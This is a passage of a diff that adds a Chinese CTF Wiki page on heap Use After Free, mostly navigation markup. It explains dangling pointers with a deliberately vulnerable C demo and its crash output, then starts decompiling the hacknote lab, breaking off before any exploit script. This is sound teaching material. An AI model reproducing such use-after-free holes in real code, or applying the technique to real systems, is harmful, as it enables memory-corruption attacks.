+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../heap_structure/" title="堆相关数据结构" class="md-nav__link">
+      堆相关数据结构
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../heap_implementation_details/" title="深入理解堆的实现" class="md-nav__link">
+      深入理解堆的实现
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../heapoverflow_basic/" title="堆溢出" class="md-nav__link">
+      堆溢出
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../off_by_one/" title="堆中的 Off-By-One" class="md-nav__link">
+      堆中的 Off-By-One
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../unlink/" title="Unlink" class="md-nav__link">
+      Unlink
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+  
+
+
+  <li class="md-nav__item md-nav__item--active">
+    
+    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="__toc">
+    
+      
+    
+    
+      <label class="md-nav__link md-nav__link--active" for="__toc">
+        Use After Free
+      </label>
+    
+    <a href="./" title="Use After Free" class="md-nav__link md-nav__link--active">
+      Use After Free
+    </a>
+    
+      
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">目录</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" title="原理" class="md-nav__link">
+    原理
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" title="例子" class="md-nav__link">
+    例子
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" title="功能分析" class="md-nav__link">
+    功能分析
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#add_note" title="add_note" class="md-nav__link">
+    add_note
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#print_note" title="print_note" class="md-nav__link">
+    print_note
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#delete_note" title="delete_note" class="md-nav__link">
+    delete_note
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" title="利用分析" class="md-nav__link">
+    利用分析
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" title="利用脚本" class="md-nav__link">
+    利用脚本
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_6" title="题目" class="md-nav__link">
+    题目
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+        <li class="md-nav__item">
+          <a href="#__comments" title="评论" class="md-nav__link md-nav__link--active">
+            评论
+          </a>
+        </li>
+      
+    </ul>
+  
+</nav>
+    
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../fastbin_attack/" title="Fastbin Attack" class="md-nav__link">
+      Fastbin Attack
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../tcache_attack/" title="Tcache 利用" class="md-nav__link">
+      Tcache 利用
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../chunk_extend_overlapping/" title="Chunk Extend / Overlapping" class="md-nav__link">
+      Chunk Extend / Overlapping
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../house_of_einherjar/" title="House Of Einherjar" class="md-nav__link">
+      House Of Einherjar
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../house_of_lore/" title="House of Lore" class="md-nav__link">
+      House of Lore
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../house_of_force/" title="House Of Force" class="md-nav__link">
+      House Of Force
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../unsorted_bin_attack/" title="Unsorted Bin Attack" class="md-nav__link">
+      Unsorted Bin Attack
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../house_of_orange/" title="House of Orange" class="md-nav__link">
+      House of Orange
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../house_of_rabbit/" title="House of Rabbit" class="md-nav__link">
+      House of Rabbit
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../house_of_roman/" title="House of Roman" class="md-nav__link">
+      House of Roman
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-5" type="checkbox" id="nav-8-2-5">
+    
+    <label class="md-nav__link" for="nav-8-2-5">
+      IO_FILE 利用
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-8-2-5">
+        IO_FILE 利用
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../io_file/introduction/" title="FILE 文件结构介绍" class="md-nav__link">
+      FILE 文件结构介绍
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../io_file/fake-vtable-exploit/" title="伪造 vtable 劫持程序流程" class="md-nav__link">
+      伪造 vtable 劫持程序流程
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../io_file/fsop/" title="FSOP" class="md-nav__link">
+      FSOP
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../io_file/exploit-in-libc2.24/" title="新版本 libc 下 IO_FILE 的利用" class="md-nav__link">
+      新版本 libc 下 IO_FILE 的利用
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-6" type="checkbox" id="nav-8-2-6">
+    
+    <label class="md-nav__link" for="nav-8-2-6">
+      条件竞争
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-8-2-6">
+        条件竞争
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../race-condition/introduction/" title="条件竞争介绍" class="md-nav__link">
+      条件竞争介绍
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../race-condition/problem/" title="例题" class="md-nav__link">
+      例题
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-7" type="checkbox" id="nav-8-2-7">
+    
+    <label class="md-nav__link" for="nav-8-2-7">
+      整数溢出
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-8-2-7">
+        整数溢出
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../integeroverflow/intof/" title="整数溢出原理介绍" class="md-nav__link">
+      整数溢出原理介绍
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-8" type="checkbox" id="nav-8-2-8">
+    
+    <label class="md-nav__link" for="nav-8-2-8">
+      沙箱逃逸
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-8-2-8">
+        沙箱逃逸
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../sandbox/python-sandbox-escape/" title="Python沙箱逃逸" class="md-nav__link">
+      Python沙箱逃逸
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-9" type="checkbox" id="nav-8-2-9">
+    
+    <label class="md-nav__link" for="nav-8-2-9">
+      arm-pwn
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-8-2-9">
+        arm-pwn
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../arm/environment/" title="环境搭建" class="md-nav__link">
+      环境搭建
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../arm/arm_rop/" title="arm-rop" class="md-nav__link">
+      arm-rop
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-2-10" type="checkbox" id="nav-8-2-10">
+    
+    <label class="md-nav__link" for="nav-8-2-10">
+      kernel
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-8-2-10">
+        kernel
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../kernel/environment/" title="环境搭建" class="md-nav__link">
+      环境搭建
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../kernel/basic_knowledge/" title="基础知识" class="md-nav__link">
+      基础知识
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../kernel/kernel_uaf/" title="kernel-UAF" class="md-nav__link">
+      kernel-UAF
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../kernel/kernel_rop/" title="kernel-ROP" class="md-nav__link">
+      kernel-ROP
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../kernel/ret2usr/" title="ret2usr" class="md-nav__link">
+      ret2usr
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../kernel/bypass_smep/" title="bypass-smep" class="md-nav__link">
+      bypass-smep
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-8-3" type="checkbox" id="nav-8-3">
+    
+    <label class="md-nav__link" for="nav-8-3">
+      Windows Pwn
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-8-3">
+        Windows Pwn
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../windows/readme/" title="概述" class="md-nav__link">
+      概述
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+      
+      
+      
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9" type="checkbox" id="nav-9">
+    
+    <label class="md-nav__link" for="nav-9">
+      Android
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
+      <label class="md-nav__title" for="nav-9">
+        Android
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../android/basic_develop/basic_develop/" title="Android 开发基础" class="md-nav__link">
+      Android 开发基础
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9-2" type="checkbox" id="nav-9-2">
+    
+    <label class="md-nav__link" for="nav-9-2">
+      Android 运行机制简述
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-9-2">
+        Android 运行机制简述
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../android/basic_operating_mechanism/readme/" title="简述" class="md-nav__link">
+      简述
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9-2-2" type="checkbox" id="nav-9-2-2">
+    
+    <label class="md-nav__link" for="nav-9-2-2">
+      Android 中 Java 层的运行机制
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-9-2-2">
+        Android 中 Java 层的运行机制
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../android/basic_operating_mechanism/java_layer/readme/" title="简述" class="md-nav__link">
+      简述
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../android/basic_operating_mechanism/java_layer/smali/smali/" title="Smali 介绍" class="md-nav__link">
+      Smali 介绍
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9-2-2-3" type="checkbox" id="nav-9-2-2-3">
+    
+    <label class="md-nav__link" for="nav-9-2-2-3">
+      Dex && ODEX
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="4">
+      <label class="md-nav__title" for="nav-9-2-2-3">
+        Dex && ODEX
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../android/basic_operating_mechanism/java_layer/dex/dex/" title="DEX" class="md-nav__link">
+      DEX
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../android/basic_operating_mechanism/java_layer/dex/odex/" title="ODEX" class="md-nav__link">
+      ODEX
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9-2-3" type="checkbox" id="nav-9-2-3">
+    
+    <label class="md-nav__link" for="nav-9-2-3">
+      Android Native 层介绍
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-9-2-3">
+        Android Native 层介绍
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../android/basic_operating_mechanism/native_layer/so/" title="Android So 介绍" class="md-nav__link">
+      Android So 介绍
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9-3" type="checkbox" id="nav-9-3">
+    
+    <label class="md-nav__link" for="nav-9-3">
+      Android 逆向基本介绍
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
+      <label class="md-nav__title" for="nav-9-3">
+        Android 逆向基本介绍
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../android/basic_reverse/overview/" title="简述" class="md-nav__link">
+      简述
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../android/basic_reverse/android_code_location/" title="Android 关键代码定位" class="md-nav__link">
+      Android 关键代码定位
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9-3-3" type="checkbox" id="nav-9-3-3">
+    
+    <label class="md-nav__link" for="nav-9-3-3">
+      Android 简单静态分析
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-9-3-3">
+        Android 简单静态分析
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../android/basic_reverse/static/java-example/" title="Android Java 层静态分析" class="md-nav__link">
+      Android Java 层静态分析
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../android/basic_reverse/static/so-example/" title="Android Native 层静态分析" class="md-nav__link">
+      Android Native 层静态分析
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../android/basic_reverse/static/complex-example/" title="Android 静态分析混合例子" class="md-nav__link">
+      Android 静态分析混合例子
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item md-nav__item--nested">
+    
+      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-9-3-4" type="checkbox" id="nav-9-3-4">
+    
+    <label class="md-nav__link" for="nav-9-3-4">
+      Android 简单动态分析
+    </label>
+    <nav class="md-nav" data-md-component="collapsible" data-md-level="3">
+      <label class="md-nav__title" for="nav-9-3-4">
+        Android 简单动态分析
+      </label>
+      <ul class="md-nav__list" data-md-scrollfix>
+        
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../android/basic_reverse/dynamic/dynamic_debug/" title="简述" class="md-nav__link">
+      简述
+    </a>
+  </li>
+
+        
+          
+          
+          
+
+
+  <li class="md-nav__item">
+    <a href="../../../../android/basic_reverse/dynamic/ida_native_debug/" title="Android 动态调试 So" class="md-nav__link">
+      Android 动态调试 So
+    </a>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+        
+      </ul>
+    </nav>
+  </li>
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+<nav class="md-nav md-nav--secondary">
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">目录</label>
+    <ul class="md-nav__list" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#_1" title="原理" class="md-nav__link">
+    原理
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_2" title="例子" class="md-nav__link">
+    例子
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#_3" title="功能分析" class="md-nav__link">
+    功能分析
+  </a>
+  
+    <nav class="md-nav">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#add_note" title="add_note" class="md-nav__link">
+    add_note
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#print_note" title="print_note" class="md-nav__link">
+    print_note
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#delete_note" title="delete_note" class="md-nav__link">
+    delete_note
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_4" title="利用分析" class="md-nav__link">
+    利用分析
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#_5" title="利用脚本" class="md-nav__link">
+    利用脚本
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_6" title="题目" class="md-nav__link">
+    题目
+  </a>
+  
+</li>
+      
+      
+      
+      
+      
+        <li class="md-nav__item">
+          <a href="#__comments" title="评论" class="md-nav__link md-nav__link--active">
+            评论
+          </a>
+        </li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          <div class="md-content">
+            <article class="md-content__inner md-typeset">
+              
+                
+                  <a href="https://github.com/ctf-wiki/ctf-wiki/blob/master/docs/pwn/linux/glibc-heap/use_after_free.md" title="编辑此页" class="md-icon md-content__icon">&#xE3C9;</a>
+                
+                
+                <h1 id="use-after-free">Use After Free<a class="headerlink" href="#use-after-free" title="Permanent link">&para;</a></h1>
+<h2 id="_1">原理<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>简单的说，Use After Free 就是其字面所表达的意思，当一个内存块被释放之后再次被使用。但是其实这里有以下几种情况</p>
+<ul>
+<li>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</li>
+<li>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</li>
+<li>内存块被释放后，其对应的指针没有被设置为NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong>。</li>
+</ul>
+<p>而我们一般所指的 <strong>Use After Free</strong> 漏洞主要是后两种。此外，<strong>我们一般称被释放后没有被设置为NULL的内存指针为dangling pointer。</strong></p>
+<p>这里给出一个简单的例子</p>
+<div class="codehilite"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
+<span class="k">typedef</span> <span class="k">struct</span> <span class="n">name</span> <span class="p">{</span>
+  <span class="kt">char</span> <span class="o">*</span><span class="n">myname</span><span class="p">;</span>
+  <span class="kt">void</span> <span class="p">(</span><span class="o">*</span><span class="n">func</span><span class="p">)(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">);</span>
+<span class="p">}</span> <span class="n">NAME</span><span class="p">;</span>
+<span class="kt">void</span> <span class="nf">myprint</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span> <span class="p">{</span> <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span> <span class="p">}</span>
+<span class="kt">void</span> <span class="nf">printmyname</span><span class="p">()</span> <span class="p">{</span> <span class="n">printf</span><span class="p">(</span><span class="s">&quot;call print my name</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span> <span class="p">}</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+  <span class="n">NAME</span> <span class="o">*</span><span class="n">a</span><span class="p">;</span>
+  <span class="n">a</span> <span class="o">=</span> <span class="p">(</span><span class="n">NAME</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">name</span><span class="p">));</span>
+  <span class="n">a</span><span class="o">-&gt;</span><span class="n">func</span> <span class="o">=</span> <span class="n">myprint</span><span class="p">;</span>
+  <span class="n">a</span><span class="o">-&gt;</span><span class="n">myname</span> <span class="o">=</span> <span class="s">&quot;I can also use it&quot;</span><span class="p">;</span>
+  <span class="n">a</span><span class="o">-&gt;</span><span class="n">func</span><span class="p">(</span><span class="s">&quot;this is my function&quot;</span><span class="p">);</span>
+  <span class="c1">// free without modify</span>
+  <span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
+  <span class="n">a</span><span class="o">-&gt;</span><span class="n">func</span><span class="p">(</span><span class="s">&quot;I can also use it&quot;</span><span class="p">);</span>
+  <span class="c1">// free with modify</span>
+  <span class="n">a</span><span class="o">-&gt;</span><span class="n">func</span> <span class="o">=</span> <span class="n">printmyname</span><span class="p">;</span>
+  <span class="n">a</span><span class="o">-&gt;</span><span class="n">func</span><span class="p">(</span><span class="s">&quot;this is my function&quot;</span><span class="p">);</span>
+  <span class="c1">// set NULL</span>
+  <span class="n">a</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;this pogram will crash...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+  <span class="n">a</span><span class="o">-&gt;</span><span class="n">func</span><span class="p">(</span><span class="s">&quot;can not be printed...&quot;</span><span class="p">);</span>
+<span class="p">}</span>
+</pre></div>
+
+<p>运行结果如下</p>
+<div class="codehilite"><pre><span></span>➜  use_after_free git:<span class="o">(</span>use_after_free<span class="o">)</span> ✗ ./use_after_free                      
+this is my <span class="k">function</span>
+I can also use it
+call print my name
+this pogram will crash...
+<span class="o">[</span><span class="m">1</span><span class="o">]</span>    <span class="m">38738</span> segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>  ./use_after_free
+</pre></div>
+
+<h2 id="_2">例子<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>这里我们以 HITCON-training 中的 <a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote">lab 10 hacknote</a> 为例。</p>
+<h3 id="_3">功能分析<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h3>
+<p>我们可以简单分析下程序，可以看出在程序的开头有个menu函数，其中有</p>
+<div class="codehilite"><pre><span></span>  <span class="n">puts</span><span class="p">(</span><span class="s">&quot; 1. Add note          &quot;</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&quot; 2. Delete note       &quot;</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&quot; 3. Print note        &quot;</span><span class="p">);</span>
+  <span class="n">puts</span><span class="p">(</span><span class="s">&quot; 4. Exit              &quot;</span><span class="p">);</span>
+</pre></div>
+
+<p>故而程序应该主要有3个功能。之后程序会根据用户的输入执行相应的功能。</p>
+<h4 id="add_note">add_note<a class="headerlink" href="#add_note" title="Permanent link">&para;</a></h4>
+<p>根据程序，我们可以看出程序最多可以添加5个note。每个note有两个字段put与content，其中put会被设置为一个函数，其函数会输出 content 具体的内容。</p>
+<div class="codehilite"><pre><span></span><span class="kt">unsigned</span> <span class="kt">int</span> <span class="nf">add_note</span><span class="p">()</span>
+<span class="p">{</span>
+  <span class="n">note</span> <span class="o">*</span><span class="n">v0</span><span class="p">;</span> <span class="c1">// ebx</span>
+  <span class="kt">signed</span> <span class="kt">int</span> <span class="n">i</span><span class="p">;</span> <span class="c1">// [esp+Ch] [ebp-1Ch]</span>
+  <span class="kt">int</span> <span class="n">size</span><span class="p">;</span> <span class="c1">// [esp+10h] [ebp-18h]</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">;</span> <span class="c1">// [esp+14h] [ebp-14h]</span>
+  <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">v5</span><span class="p">;</span> <span class="c1">// [esp+1Ch] [ebp-Ch]</span>
+
+  <span class="n">v5</span> <span class="o">=</span> <span class="n">__readgsdword</span><span class="p">(</span><span class="mh">0x14u</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span> <span class="n">count</span> <span class="o">&lt;=</span> <span class="mi">5</span> <span class="p">)</span>
+  <span class="p">{</span>
+    <span class="k">for</span> <span class="p">(</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;=</span> <span class="mi">4</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span> <span class="p">)</span>
+    <span class="p">{</span>
+      <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">notelist</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">)</span>
+      <span class="p">{</span>
+        <span class="n">notelist</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8u</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">notelist</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="p">)</span>
+        <span class="p">{</span>
+          <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Alloca Error&quot;</span><span class="p">);</span>
+          <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+        <span class="p">}</span>
+        <span class="n">notelist</span><span class="p">[</span><span class="n">i</span><span class="p">]</span><span class="o">-&gt;</span><span class="n">put</span> <span class="o">=</span> <span class="n">print_note_content</span><span class="p">;</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Note size :&quot;</span><span class="p">);</span>
+        <span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">buf</span><span class="p">,</span> <span class="mi">8u</span><span class="p">);</span>
